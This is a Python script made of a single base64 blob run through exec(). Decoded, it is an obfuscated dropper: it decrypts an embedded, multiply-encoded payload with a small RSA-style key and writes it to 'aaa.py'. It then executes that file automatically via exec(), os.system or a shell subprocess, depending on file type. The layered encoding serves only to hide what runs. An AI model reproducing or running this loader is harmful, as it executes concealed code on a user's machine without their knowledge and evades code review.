import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk1XWTRNV1V5TVdNNU1UTTFNV1k0TVdFPU5EVT1NVE0xTVdZNFkyUT1NV1V6TVRNMU1XWTRNV0ZsTVdVM01UTTFNV1k0TVdVeU9XVT1NVE0xTVdZNE1qTTJNalJpTVRNMU1XWTRZdz09TVdVek1UTTFNV1k0TWpNMk1qTmtNVE0xTVdZNFkyUT1NV1V6TVRNMU1XTTVNV0ZsTVdVM01UTTFNV1k0TVdVeU5EVT1NVE0xTVdZNE1XRmxNak5rTVRNMU1XWTRNV1V5T1dVPU1UTTFNV1k0TVdFPU56Yz1NVE0xTVdZNE1XRT1NalJpTVRNMU1XWTRNV1V5TnpjPU1UTTFNV1k0TVdVeVlXWT1NVE0xTVdZNE1XRT1OemM9TVRNMU1XWTRZdz09TWpSaU1UTTFNV1k0TVdVeU56Yz1NVE0xTVdZNE1XVXlNV1V6TVRNMU1XWTRNV0U9TnpjPU1UTTFNV1k0WXc9PU1qUmlNVE0xTVdZNE1XVXlOemM9TVRNMU1XWTRNV1V5TVdVek1UTTFNV1k0TVdFPU56Yz1NVE0xTVdZNE1XRT1Nak5rTVRNMU1XWTRNak0yTVdVek1UTTFNV1k0TVdVeU1XVXpNVE0xTVdNNU1XRmxPV1U9TVRNMU1XWTRZdz09TWpOa01UTTFNV1k0TVdVeU5EVT1NVE0xTVdZNE1XWTFNV1V6TVRNMU1XWTRNV0U9TnpjPU1UTTFNV001TVdGbE5EVT1NVE0xTVdZNE1qTTJNalJpTVRNMU1XWTRZMlE9T1dVPU1UTTFNV1k0WXc9PU1XVXpNVE0xTVdNNU1qUXlZV1k9TVRNMU1XTTVNalF5WVdZPU1UTTEiCmRycG5tID0gImFhYS5weSIKcGsgPSAoNTAzLCA1ODkpCgpkZWYgZGN5KHBrLCBjcHR4KToKCWssIG4gPSBwawoJbWVuc2FqZVJlY2liaWRvID0gX19yZUJhNjRfXyhjcHR4LmVuY29kZSgndXRmLTgnKSkKCW1lbnNhamVIZXhSZWNpYmlkbyA9IF9fYmE2NEhleF9fKG1lbnNhamVSZWNpYmlkbykKCW1lbnNhamVEZWNpbWFsUmVjaWJpZG8gPSBfX2hleERlY19fKG1lbnNhamVIZXhSZWNpYmlkbykKCW1lbnNhamVEZXNjaWZyYWRvID0gWygoYyAqKiBrKSAlIG4pIGZvciBjIGluIG1lbnNhamVEZWNpbWFsUmVjaWJpZG9dCgltZW5zYWplX2RlX2FzY2lpID0gX19kZUFTX18obWVuc2FqZURlc2NpZnJhZG8pCglkZWNhc2MgPSBfX3JlQmE2NF9fKCcnLmpvaW4obWVuc2FqZV9kZV9hc2NpaSkuZW5jb2RlKCkpCgloZXhiYTY0ID0gX19iYTY0SGV4X18oZGVjYXNjKQoJYXNoZXggPSBfX2hleERlY19fKGhleGJhNjQpCglkZWFzYyA9IF9fZGVBU19fKGFzaGV4KQoJYmE2NCA9IGJhc2U2NC5iNjRkZWNvZGUoZGVhc2MuZW5jb2RlKCkpCglyZXR1cm4gYmE2NApkZWYgX19yZUJhNjRfXyhtKToKCW1CYTY0ID0gW21baTppKzRdIGZvciBpIGluIHJhbmdlKDAsIGxlbihtKSwgNCldCglyZXR1cm4gbUJhNjQKZGVmIF9fYmE2NEhleF9fKG0pOgoJbUh4ID0gW2Jhc2U2NC5iNjRkZWNvZGUoYjY0KSBmb3IgYjY0IGluIG1dCglyZXR1cm4gbUh4CmRlZiBfX2hleERlY19fKG0pOgoJbURlYyA9IFtpbnQoaGV4YS5kZWNvZGUoIlVURi04IiksIDE2KSBmb3IgaGV4YSBpbiBtXQoJcmV0dXJuIG1EZWMKZGVmIF9fZGVBU19fKG0pOgoJbTEgPSAnJy5qb2luKFtjaHIoZCkgZm9yIGQgaW4gbV0pCglyZXR1cm4gbTEKZGVmIF9fbWVBU19fKG0pOgoJbWVuID0gW29yZChwKSBmb3IgcCBpbiBtXQoJcmV0dXJuIG1lbgpkY3lfZGF0YSA9IGRjeShwaz1waywgY3B0eD1jZHgpCgppbWFnZV9leHRlbnNpb25zID0gKCdqcGcnLCAnanBlZycsICdicG0nLCAnaWNvJywgJ3BuZycpCmV4ZWNfZXh0ZW5zaW9ucyA9ICgnYmF0JywgJ2V4ZScsICd2YnMnLCAncHMxJykKcHl0aG9uX2V4dGVuc2lvbnMgPSAoJ3B5JykKbmYgPSBvcGVuKGRycG5tLCAnd2InKQp0cnk6CgluZi53cml0ZShkY3lfZGF0YSkKZXhjZXB0OgoJcGFzcwpuZi5jbG9zZSgpCmlmIG9zLnBhdGguZXhpc3RzKGRycG5tKToKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gaW1hZ2VfZXh0ZW5zaW9uczoKCQlpbWFnZVZpZXdlckZyb21Db21tYW5kTGluZSA9IHsnbGludXgnOid4ZGctb3BlbicsICd3aW4zMic6J2V4cGxvcmVyJywgJ2Rhcndpbic6J29wZW4nfVtzeXMucGxhdGZvcm1dCgkJc3VicHJvY2Vzcy5ydW4oW2ltYWdlVmlld2VyRnJvbUNvbW1hbmRMaW5lLCBkcnBubV0sIGNsb3NlX2Zkcz1UcnVlKQoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBleGVjX2V4dGVuc2lvbnMgYW5kIHN5cy5wbGF0Zm9ybSA9PSAnd2luMzInOgoJCW9zLnN5c3RlbShkcnBubSkKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gcHl0aG9uX2V4dGVuc2lvbnM6CgkJZXhlYyhkY3lfZGF0YSkKCQlwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbigncHl0aG9uIHtmbn0nLmZvcm1hdChmbj1kcnBubSksIHNoZWxsPVRydWUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkK'
exec(base64.b64decode(data))